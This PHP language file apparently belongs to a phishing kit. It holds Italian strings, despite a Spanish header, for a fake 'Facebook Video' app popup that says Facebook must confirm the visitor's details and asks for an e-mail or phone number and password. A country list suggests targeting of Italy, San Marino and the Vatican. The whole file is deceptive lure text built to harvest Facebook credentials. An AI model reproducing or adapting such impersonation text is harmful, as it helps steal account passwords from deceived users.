<?php
/*
-----------------
Idioma: Espanol
-----------------
*/
 
$lang = array();
 
// General

$lang['LANG'] = 'it';
 
// Fondo

$lang['TITULO_PAGINA'] = 'Applicazione Facebook';
 
// Pop-UP
 
$lang['POPUP_TITULO'] = 'Facebook Video applicazione (gratuita)';
$lang['POPUP_DESCRIPCION'] = 'Facebook ha bisogno di confermare le seguenti informazioni per consentire l\'accesso a questa applicazione video, il Login!';
$lang['POPUP_CORREO'] = 'E-mail o telefono';
$lang['POPUP_CONTRASENA'] = 'Password';
$lang['POPUP_SUBMIT'] = 'Accedi';
$lang['POPUP_CANDADO'] = 'Questa applicazione non � permesso di pubblicare su Facebook.';

/*
array("Italy", "San Marino", "Holy See (VATICAN City State)")
*/